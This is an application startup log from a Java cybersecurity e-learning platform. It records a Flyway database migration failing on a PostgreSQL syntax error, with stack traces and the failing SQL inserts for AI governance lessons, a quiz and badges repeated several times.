    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:27:01.093 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:27:01.095 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:27:01.194 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:27:01.308 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:27:01.308 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:27:01.308 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:27:01.489 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:27:01.529 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:27:01.536 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.028s)
2026-03-12 00:27:01.561 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" with baseline ...
2026-03-12 00:27:01.619 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbBaseline - Successfully baselined schema with version: 0
2026-03-12 00:27:01.707 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 0
2026-03-12 00:27:01.756 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:27:01.768 [vert.x-eventloop-thread-1] WARN  o.f.c.i.s.DefaultSqlScriptExecutor - DB: extension "uuid-ossp" already exists, skipping (SQL State: 42710 - Error Code: 0)
2026-03-12 00:27:02.096 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:27:02.152 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:27:02.187 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "3 - Additional Learning Paths" failed! Changes successfully rolled back.
2026-03-12 00:27:02.194 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:27:02.205 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:27:02.227 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
